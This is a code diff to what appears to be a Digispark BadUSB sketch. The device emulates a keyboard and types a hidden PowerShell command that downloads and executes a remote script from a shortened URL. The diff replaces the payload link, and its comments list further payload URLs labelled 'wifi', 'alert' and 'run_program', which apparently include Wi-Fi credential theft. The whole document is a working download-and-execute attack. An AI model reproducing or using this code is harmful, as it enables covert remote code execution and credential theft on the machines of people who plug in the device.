@@ -8,11 +8,12 @@ void winRun(const char* command){
 
 void downloadAndRun(){
   DigiKeyboard.delay(500);
-  winRun("powershell -W Hidden \"IEX (New-Object Net.WebClient).DownloadString('https://bit.ly/3HVeXwZ');\"");
+  winRun("powershell -W Hidden \"IEX (New-Object Net.WebClient).DownloadString('https://bit.ly/3HXQQOr');\"");
 }
 
 /// wifi : https://bit.ly/3HVeXwZ
 /// alert: https://bit.ly/3sPIkL7
+/// run_program: https://bit.ly/3HXQQOr
 // powershell -W Hidden "IEX (New-Object Net.WebClient).DownloadString('https://bit.ly/3HVeXwZ');"
 void setup() {
   DigiKeyboard.delay(1500);
